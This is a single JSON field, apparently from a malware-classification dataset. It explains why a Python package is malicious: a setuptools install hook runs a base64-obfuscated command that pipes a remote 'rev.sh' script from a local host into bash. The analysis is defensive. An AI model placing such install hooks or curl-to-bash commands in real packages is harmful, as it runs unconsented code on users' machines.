      "malicious_behavior": "This code is malicious. It defines a custom setuptools install command (AfterInstall) that, upon package installation, executes a function (notmalfunc) which runs a base64-decoded shell command via os.system. The decoded command is: 'curl  -s http://localhost:8000/rev.sh | bash', which downloads and executes a shell script from a local server. This is a classic supply chain attack pattern: arbitrary code execution is triggered automatically during package installation, without user consent or notification. The use of base64 encoding to obfuscate the command, the execution of a remote script, and the embedding of this logic in the install hook are all strong indicators of malicious intent. This pattern is never observed in benign software and is a hallmark of Python malware and supply chain attacks.",
